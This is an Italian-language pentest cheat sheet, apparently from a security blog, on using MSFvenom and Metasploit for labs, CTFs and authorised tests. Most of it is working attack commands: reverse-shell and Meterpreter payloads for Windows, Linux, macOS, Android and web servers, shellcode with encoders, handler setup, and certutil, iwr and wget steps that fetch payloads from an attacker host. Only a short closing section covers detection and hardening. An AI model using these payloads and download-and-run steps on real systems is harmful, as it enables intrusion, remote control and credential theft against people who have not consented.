---
title: 'MSFvenom Cheat Sheet: Comandi, Payload, Shellcode & Bypass'
slug: msfvenom
description: 'MSFvenom exploit per lab e pentest: sintassi, payload staged e stageless, formati EXE, ELF, PHP, WAR e MSI, shellcode con bad characters, handler e detection.'
image: /msfvenom-payload-generator-metasploit.webp
draft: false
date: 2026-02-18T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - msfvenom
  - metasploit
  - payload
  - shellcode
  - reverse shell
---

# Come Usare MSFvenom: Cheat Sheet per Windows, Linux e Web

`msfvenom` è il generatore di payload di Metasploit: scegli un payload, passi i parametri e ottieni un file (o shellcode) nel formato che ti serve. Questa è una cheat sheet operativa per lab, CTF (Hack The Box, OSCP, OSEP, OSED) e pentest autorizzati. Per il framework completo vedi [Metasploit](https://hackita.it/articoli/metasploit/) e [msfconsole](https://hackita.it/articoli/msfconsole/).

**Risposta rapida:** trova il payload con `msfvenom -l payloads`, controlla i parametri con `--list-options`, scegli il formato con `msfvenom --list formats`, genera con `-p ... -f ... -o ...` e apri un handler con **lo stesso payload**.

Un comando accettato da msfvenom non basta: il file deve essere adatto al contesto in cui verrà eseguito (architettura, formato, modalità di avvio).

## Quale Payload e Quale Formato

Il **payload** decide cosa fa il codice. Il **formato** decide in che contenitore finisce (`exe`, `dll`, `elf`, `raw`...). Lo stesso payload in formati diversi non si carica allo stesso modo.

| Obiettivo           | Payload tipico                        | Formato                        |
| ------------------- | ------------------------------------- | ------------------------------ |
| Eseguibile Windows  | `windows/x64/shell_reverse_tcp`       | `exe`                          |
| Meterpreter Windows | `windows/x64/meterpreter/reverse_tcp` | `exe`                          |
| Eseguibile Linux    | `linux/x64/shell_reverse_tcp`         | `elf`                          |
| Web PHP             | `php/reverse_php`                     | `raw`                          |
| Web JSP / Tomcat    | `java/jsp_shell_reverse_tcp`          | `raw` / `war`                  |
| Web IIS             | `windows/x64/shell_reverse_tcp`       | `aspx` / `asp`                 |
| Servizio Windows    | `windows/x64/shell_reverse_tcp`       | `exe-service`                  |
| MSI                 | `windows/x64/shell_reverse_tcp`       | `msi`                          |
| Shellcode exploit   | `windows/shell_reverse_tcp`           | `c`, `python`, `csharp`, `raw` |

I nomi dei payload variano con la versione: verificali sempre con `msfvenom -l payloads | grep <piattaforma>`.

## Sintassi Base

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<porta> -f <formato> -o <file>
```

| Opzione             | Funzione                                                     |
| ------------------- | ------------------------------------------------------------ |
| `-p`                | Payload                                                      |
| `-f`                | Formato di output                                            |
| `-o`                | Salva su file                                                |
| `-a` / `--platform` | Architettura / piattaforma                                   |
| `-b`                | Bad characters da evitare (`'\x00\x0a\x0d'`)                 |
| `-e`                | Encoder                                                      |
| `-i`                | Passaggi di encoding                                         |
| `-x` / `-k`         | Template eseguibile / mantiene il comportamento del template |
| `-s`                | Dimensione massima del payload                               |
| `-n`                | NOP sled                                                     |
| `-v`                | Nome della variabile nei formati di codice                   |
| `--list-options`    | Opzioni del payload                                          |
| `-l`                | Elenca payloads, encoders, nops, formats                     |

`LHOST` e `LPORT` si scrivono senza trattino.

## Fase 0 — Esplorare e Verificare l'Ambiente

```bash
msfvenom -h
msfconsole -v                          # versione del framework
msfvenom -l payloads | grep windows/x64
msfvenom --list formats
msfvenom -l encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

## Fase 1 — Windows (exe)

```bash
# Shell stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# 32 bit
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell32.exe
```

Output esempio (le dimensioni cambiano con payload e versione):

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Scegliere x86 o x64: conta l'architettura del **processo che esegue il payload**, non solo quella del sistema. Un x86 gira anche su Windows a 64 bit; verifica sul target con `echo %PROCESSOR_ARCHITECTURE%`.

## Fase 2 — Staged vs Stageless

Convenzione dei nomi (verificala sul payload concreto con `-l payloads`):

| Tipo      | Esempio                               | Come funziona                                            |
| --------- | ------------------------------------- | -------------------------------------------------------- |
| Staged    | `windows/x64/meterpreter/reverse_tcp` | File piccolo (stager), scarica il resto alla connessione |
| Stageless | `windows/x64/meterpreter_reverse_tcp` | Tutto nel file, nessun download successivo               |

Per le shell semplici: `windows/x64/shell/reverse_tcp` (staged) e `windows/x64/shell_reverse_tcp` (stageless). Il payload dell'**handler** deve coincidere esattamente con quello generato. Con uno stageless puoi usare anche un listener semplice come [Netcat](https://hackita.it/articoli/netcat/).

## Fase 3 — Linux e macOS

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o met.elf
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f macho -o shell.macho
```

Sul target:

```bash
chmod +x shell.elf && ./shell.elf
```

Per Linux a 32 bit usa `linux/x86/...`.

## Fase 4 — Payload Web

```bash
# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# JSP e WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# ASPX / ASP (IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp
```

Prima dell'upload ispeziona il risultato:

```bash
head -c 300 shell.php      # il codice PHP è valido e leggibile?
php -l shell.php           # controllo sintassi
file shell.war shell.jsp
```

Verifica che il runtime del server (versione PHP, Tomcat, IIS) e le regole di upload permettano l'esecuzione. Il WAR si deploya dal manager di Tomcat: vedi [porta 8080 Tomcat](https://hackita.it/articoli/porta-8080-tomcat/). Per shell web minime: [Web Shell](https://hackita.it/articoli/web-shell/).

## Fase 5 — One-Liner

Quando puoi eseguire comandi ([RCE](https://hackita.it/articoli/rce/)) ma non portare un file:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.5 LPORT=4444 -f raw
```

## Fase 6 — Formati Speciali Windows

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o svc.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll
```

| Formato       | Quando                                      | Attenzione                                                                                                                                                                                           |
| ------------- | ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `exe-service` | Binario avviato dal Service Control Manager | Un `exe` normale come servizio va in timeout. Non risolve da solo i permessi: vedi [WinPEAS](https://hackita.it/articoli/winpeas/)                                                                   |
| `msi`         | Installazione con `msiexec`                 | Funziona con privilegi elevati solo se `AlwaysInstallElevated` è davvero attivo (entrambe le chiavi): vedi [Privilege Escalation Windows](https://hackita.it/articoli/privilege-escalation-windows/) |
| `dll`         | DLL caricata da un processo                 | Una DLL generica non sostituisce una DLL qualsiasi: contano architettura, modalità di caricamento ed export richiesti                                                                                |

## Fase 7 — Android

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -o app.apk
```

L'APK deve essere firmato per essere installato. Usa un emulatore o un dispositivo di test.

## Fase 8 — Shellcode ed Exploit Development

Per [buffer overflow](https://hackita.it/articoli/windows-buffer-overflow-exploit/), ROP e studio per OSCP/OSED.

```bash
# Escludere i bad characters (encoder scelto in automatico)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -v shellcode

# Python
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00' -f python -v buf

# Byte grezzi e dimensione
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw | wc -c

# EXITFUNC
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f c

# Encoder esplicito con 3 passaggi e NOP sled da 16 byte
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -n 16 -b '\x00' -f c
```

| Formato di trasformazione | Uso                               |
| ------------------------- | --------------------------------- |
| `c`                       | Array C da incollare nell'exploit |
| `python` / `py`           | Variabile Python                  |
| `csharp`                  | Array C#                          |
| `powershell`              | Array PowerShell                  |
| `raw`                     | Byte grezzi                       |
| `hex`                     | Stringa esadecimale               |

### Bad characters

Un bad character è un byte che l'applicazione vulnerabile tratta in modo speciale: lo tronca, lo trasforma o interrompe la copia in memoria. Se nel tuo shellcode c'è quel byte, il payload viene corrotto prima di eseguire.

I bad chars più comuni:

| Byte   | Motivo                                                       |
| ------ | ------------------------------------------------------------ |
| `\x00` | Null byte — termina le stringhe C. Presente quasi sempre     |
| `\x0a` | Newline (`\n`) — interrompe `fgets`, `recv` con delimitatore |
| `\x0d` | Carriage return (`\r`) — stesso problema                     |
| `\x20` | Spazio — nei parser che leggono token separati da spazio     |
| `\x09` | Tab — simile allo spazio in certi parser                     |
| `\xff` | In alcune funzioni di copia con buffer a firma               |

**Come si trovano.** Non si indovinano: si mandano tutti i byte da `\x01` a `\xff` come input, si guarda il payload in memoria con un debugger (Immunity, x64dbg, WinDbg) e si confronta byte per byte. Al primo byte mancante o modificato, quella è la fine del bad char identificato. Si rimuove dalla lista di test, si ripete. La lista "classica" `\x00\x0a\x0d` è solo un punto di partenza, non vale per tutti i target.

Con `-b` passi la lista trovata. msfvenom sceglie automaticamente un encoder compatibile. Se non trova encoder che evitino tutti quei byte con l'architettura e lo spazio disponibile, il comando fallisce.

### Encoder

Un encoder trasforma i byte del payload in una forma che non contiene i bad chars, aggiungendo un piccolo stub di decodifica in testa. A runtime, lo stub decodifica il payload originale in memoria e lo esegue.

```
[stub decodificatore] + [payload XOR/trasformato]
         ↓
   a runtime: stub decodifica il payload → esecuzione normale
```

**Gli encoder NON sono un bypass antivirus.** Lo dice la documentazione ufficiale di Metasploit. Le firme AV moderni riconoscono shikata\_ga\_nai e i suoi stub da anni. Servono per i bad chars, non per l'evasione.

```bash
# Lista tutti gli encoder disponibili
msfvenom -l encoders

# Lista filtrata per x86
msfvenom -l encoders | grep x86

# Lista filtrata per x64
msfvenom -l encoders | grep x64
```

#### Encoder per x86 (32 bit)

| Encoder                 | Descrizione                                                                                                 | Bad chars gestiti                                    |
| ----------------------- | ----------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `x86/shikata_ga_nai`    | Polymorphic XOR additive feedback — il più usato e il più conosciuto dalle AV. Genera stub diverso ogni run | Quasi tutti eccetto alcuni contesti stack-dipendenti |
| `x86/call4_dword_xor`   | XOR a 4 byte con CALL per ricavare EIP — stabile, meno rumore di shikata                                    | `\x00` e i bad chars configurati                     |
| `x86/jmp_call_additive` | Additive feedback via JMP/CALL — alternativa leggera                                                        | `\x00`                                               |
| `x86/countdown`         | Decrement loop — molto semplice, stub piccolo                                                               | `\x00`                                               |
| `x86/alpha_mixed`       | Output solo caratteri alfanumerici (A-Za-z0-9) — utile se il canale accetta solo testo                      | Tutto tranne alfanumerici                            |
| `x86/alpha_upper`       | Come alpha\_mixed ma solo maiuscole                                                                         | Tutto tranne A-Z0-9                                  |

`shikata_ga_nai` è quasi sempre la prima scelta su x86 per compatibilità. Su x86 è il de facto standard nei lab OSCP/OSED.

#### Encoder per x64 (64 bit)

| Encoder                    | Descrizione                                                         |
| -------------------------- | ------------------------------------------------------------------- |
| `x64/xor`                  | XOR semplice a 8 byte — funziona ma stub fisso, rilevato facilmente |
| `x64/xor_dynamic`          | XOR con chiave derivata dinamicamente — leggermente più variabile   |
| `x64/zutto_dekiru_koko_de` | XOR con gestione di più bad chars — più flessibile di `x64/xor`     |

Per x64 le opzioni sono poche. Se hai molti bad chars su x64, la strada è spesso trovare uno shellcode che li eviti nativamente o usare un dropper custom.

#### Encoder generici

| Encoder                 | Uso                                                                                                                  |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `generic/none`          | Nessun encoding — impacchetta il payload senza trasformarlo. Utile per debug o quando vuoi il raw payload senza stub |
| `cmd/powershell_base64` | Codifica un payload cmd in base64 per PowerShell — per payload `cmd/unix/...` o `windows/...` in formato cmd         |

### `-i` — iterazioni

```bash
-i 3
```

Applica l'encoder N volte in cascata. Il payload viene codificato, poi il risultato viene ricodificato, e così via. Lo stub finale contiene N livelli di decodifica.

**Quando serve:** se dopo un passaggio restano bad chars nello stub stesso (lo stub di shikata\_ga\_nai contiene alcuni byte fissi che a volte sono bad chars nel contesto), più passaggi possono eliminarli. In pratica, `-i 2` o `-i 3` è il massimo utile. Oltre, aumenta la dimensione senza benefici reali.

**Attenzione:** più iterazioni non aumentano l'evasione AV. Aumentano solo le dimensioni e la complessità del decoder.

### `-n` — NOP sled

```bash
-n 16
```

Prepende N byte `\x90` (NOP — No Operation) prima del payload. A runtime la CPU esegue tutti i NOP senza fare nulla, poi arriva al payload.

**Perché serve nei buffer overflow.** Quando sovrascriви EIP/RIP con l'indirizzo del tuo shellcode, quell'indirizzo deve essere preciso. Se c'è un minimo di variazione nello stack (ASLR parziale, variabili di ambiente diverse, lunghezze di stack frame diverse), il salto potrebbe cadere qualche byte prima o dopo il payload. Un NOP sled ampio (es. 32–64 byte) crea una "zona di atterraggio": purché l'indirizzo cada dentro il sled, la CPU scivola fino al payload.

```
[... buffer ...][ NOP NOP NOP ... NOP ][ shellcode ][ ... ]
                 ↑                    ↑
         qualsiasi salto qui     inizio payload
         funziona lo stesso
```

**In pratica:** su OSCP/OSED usi `-n 16` o `-n 32` come default. Su exploit moderni con ASLR completo il NOP sled è inutile (l'indirizzo varia troppo), ma nei lab con ASLR disabilitato è quasi sempre utile.

### EXITFUNC

| Valore    | Comportamento                                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `thread`  | Chiude solo il thread che ha eseguito il payload — il processo padre continua. Preferibile nei lab: meno impatto sull'applicazione |
| `process` | Chiude l'intero processo — può crashare il servizio                                                                                |
| `seh`     | Usa il gestore eccezioni di Windows per uscire — utile in exploit SEH-based                                                        |
| `none`    | Nessuna exit — il thread si blocca o va in loop. Usato raramente                                                                   |

Punti da ricordare:

* I bad characters si trovano con il debugger, confrontando i byte inviati con quelli in memoria. Non usare una lista "tipica" senza averla verificata.
* La dimensione del payload (`Payload size`) è diversa da quella del file finale.
* `x86/shikata_ga_nai` funziona solo su x86: per x64 controlla `msfvenom -l encoders`.
* Gli encoder gestiscono i bad characters, **non** garantiscono l'evasione antivirus.
* `-i` oltre 3 passaggi non dà benefici pratici.
* `-n` è utile solo se ASLR è disabilitato o parziale.

## Fase 9 — Handler

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

In un solo comando:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; run"
```

* `payload`, `LHOST` e `LPORT` devono essere identici a quelli di msfvenom.
* Più sessioni: `set ExitOnSession false` e `run -j`.
* Per shell semplici basta un listener [Netcat](https://hackita.it/articoli/netcat/) o [ncat.exe](https://hackita.it/articoli/ncat-exe/).

In sessione:

```text
sysinfo
getuid
shell
background
sessions -i 1
```

`shell` apre una shell di sistema dentro Meterpreter: i comandi cambiano. Il passo successivo è la [post-exploitation](https://hackita.it/articoli/post-exploitation/).

## Fase 10 — Trasferimento e Verifica

```bash
# Host attaccante
python3 -m http.server 80
file shell.exe
sha256sum shell.exe
```

```powershell
# Target Windows
iwr http://10.10.14.5/shell.exe -OutFile C:\Windows\Temp\shell.exe
```

```cmd
certutil -urlcache -split -f http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe
```

```bash
# Target Linux
wget http://10.10.14.5/shell.elf -O /tmp/shell.elf
```

Altri metodi: [certutil](https://hackita.it/articoli/certutilexe/), [LOLBins](https://hackita.it/articoli/lolbins/), [smbserver](https://hackita.it/articoli/smbserver/).

## Troubleshooting

| Sintomo                                    | Controllo                                                                   |
| ------------------------------------------ | --------------------------------------------------------------------------- |
| Il file non parte                          | Architettura, formato, compatibilità del target                             |
| Parte ma non arriva la connessione         | `LHOST` raggiungibile (VPN, routing), firewall, listener sulla porta giusta |
| Connessione ma niente sessione Meterpreter | Nome completo del payload (staged/stageless) uguale nell'handler            |
| La sessione si chiude subito               | Architettura sbagliata o rete instabile con staged                          |
| Come servizio va in timeout                | Hai usato `exe` e non `exe-service`                                         |
| `-b` non trova encoder                     | Architettura, byte vietati, spazio disponibile                              |
| PHP/JSP non produce risultati              | Contenuto generato, runtime, log applicativi, filtri di upload              |
| I comandi non sono quelli attesi           | Shell di sistema o sessione Meterpreter?                                    |
| File cancellato subito                     | Antivirus: vedi detection                                                   |
| Template `-x` non funziona                 | `-k` è affidabile solo su sistemi vecchi; per x64 usa `-f exe-only`         |

## Detection e Difesa

I payload predefiniti di msfvenom sono molto noti e riconosciuti dalle firme. Gli eventi seguenti esistono solo se auditing e telemetria sono configurati e raccolti (4688/4697 richiedono l'audit corretto, Sysmon 1/3 richiedono Sysmon).

| Livello  | Cosa osservare                                                                                                                                                 |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| File     | Creazione in `Temp`/`Downloads`, hash, quarantena antivirus                                                                                                    |
| Processi | Processo padre, riga di comando, utente, percorso (4688, Sysmon 1)                                                                                             |
| Rete     | Connessioni in uscita da processi inattesi (Sysmon 3), download dello stage (analizzabile con [Wireshark](https://hackita.it/articoli/wireshark/)), porta 4444 |
| Sistema  | Nuovi servizi (7045, 4697), installazioni MSI                                                                                                                  |

Hardening: filtri in uscita sul [firewall](https://hackita.it/articoli/firewall/), application control (AppLocker/WDAC), niente `AlwaysInstallElevated`, ACL corrette sui servizi, blocco di upload eseguibili sui server web. Falso positivo comune: tool di amministrazione che aprono connessioni in uscita.

## Checklist Operativa

```text
[ ] Piattaforma e architettura del target verificate
[ ] Payload verificato con -l payloads e --list-options
[ ] Formato adatto al contesto (exe, exe-service, msi, dll, war, aspx, elf)
[ ] LHOST sull'interfaccia giusta (tun0 nei lab)
[ ] Handler con stesso payload, LHOST e LPORT
[ ] Bad characters trovati con il debugger prima di usare -b
[ ] File ispezionato (file, head, php -l) e hash controllato
[ ] Detection controllata nei log del lab
```

## msfvenom vs msfconsole

Sono due strumenti dello stesso framework, con ruoli diversi. Non sono alternativi: si usano insieme.

**msfvenom** genera il payload: prende un payload, ci applica parametri, encoder e formato, e produce un file o uno stream di byte. Non apre sessioni, non gestisce connessioni, non lancia exploit. È un tool da riga di comando, senza stato, che puoi chiamare in uno script o da un terminale qualsiasi. Non richiede il framework attivo.

**msfconsole** è la console interattiva del framework completo. Gestisce moduli di exploit, moduli ausiliari (scan, brute force, fuzz), moduli di post-exploitation, listener (`exploit/multi/handler`) e sessioni attive. Ha un database, una storico, variabili di workspace. È stateful: una sessione resta aperta finché non la chiudi.

|                           | msfvenom                               | msfconsole                                 |
| ------------------------- | -------------------------------------- | ------------------------------------------ |
| Funzione principale       | Genera payload e shellcode             | Esegue exploit, gestisce sessioni          |
| Stato                     | Stateless (una esecuzione, un output)  | Stateful (sessioni, workspace, database)   |
| Listener                  | No                                     | Sì (`exploit/multi/handler`)               |
| Post-exploitation         | No                                     | Sì (moduli `post/`)                        |
| Moduli exploit            | No                                     | Sì (migliaia di moduli)                    |
| Formato output            | File, shellcode, raw byte              | Sessioni interattive                       |
| Scripting                 | Facile da automatizzare in bash/Python | `msfconsole -r script.rc` o `-x "comandi"` |
| Richiede framework attivo | No                                     | Sì                                         |
| Avvio rapido              | Immediato                              | Qualche secondo (carica tutti i moduli)    |

### Workflow tipico

Il flusso standard in un lab o CTF è sempre lo stesso:

1. **msfvenom** genera il payload nel formato che serve (`exe`, `elf`, `aspx`, shellcode in C...).
2. Il payload viene consegnato al target (HTTP server, upload, RCE, social engineering).
3. **msfconsole** apre il listener (`exploit/multi/handler`) e aspetta la connessione.
4. Arriva la sessione. Da lì in poi, tutto il lavoro (post-exploitation, pivoting, dump credenziali) si fa dentro msfconsole.

```text
msfvenom → genera shell.exe
    ↓
trasferisci sul target (python3 -m http.server / certutil / iwr)
    ↓
msfconsole → exploit/multi/handler → sessione Meterpreter
    ↓
post-exploitation: migrate, hashdump, upload, load kiwi...
```

### Quando usi solo msfvenom

Ci sono scenari dove msfconsole non serve:

* **Shellcode per exploit custom** (buffer overflow, ROP): il payload viene generato con `-f c` o `-f python`, incollato nell'exploit, e ricevi la connessione con un semplice listener Netcat. Non ti serve Metasploit per il listener se usi `windows/x64/shell_reverse_tcp` (stageless).
* **Pipeline automatizzata**: uno script genera decine di payload con varianti diverse di `LHOST`, porte, architetture, encoder. msfvenom è pensato per essere chiamato da script.
* **Ambienti senza il framework**: hai solo msfvenom installato (o porti solo il binario), non vuoi avviare msfconsole.
* **Stageless + Netcat**: con un payload stageless (`shell_reverse_tcp`) basta `nc -lvnp 4444`. Il payload si connette, Netcat risponde. Zero overhead.

### Quando ti serve msfconsole

* Payload **staged** (`meterpreter/reverse_tcp`, con `/`): lo stager scarica il resto del payload dalla connessione. Serve un handler Metasploit, non Netcat.
* **Post-exploitation avanzata**: `migrate`, `hashdump`, `load kiwi` (Mimikatz integrato), `port_forward`, moduli `post/multi/recon/...`.
* **Exploit dal framework**: vulnerabilità note con modulo Metasploit (`ms17_010_eternalblue`, `eternal_romancee`, `log4shell`...).
* **Sessioni multiple**: `set ExitOnSession false` + `run -j` e gestisci più target in parallelo con `sessions -l` e `sessions -i <n>`.
* **Pivoting via route**: `route add` dentro msfconsole per instradare il traffico attraverso una sessione compromessa verso reti interne.

### Differenza nei nomi dei payload

Lo stesso payload ha un comportamento diverso in msfvenom e in msfconsole:

```bash
# msfvenom: genera il file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# msfconsole: imposta il payload sull'handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp   # deve essere identico
```

Il payload impostato nell'handler deve coincidere esattamente con quello usato in msfvenom. Se generi uno stageless (`meterpreter_reverse_tcp`) e l'handler ha uno staged (`meterpreter/reverse_tcp`), la connessione non si stabilisce.

*Riferimento: Metasploit Framework 6.x. Verifica sempre nomi di payload e formati sulla tua versione. Per il framework completo vedi la guida a [Metasploit](https://hackita.it/articoli/metasploit/).*
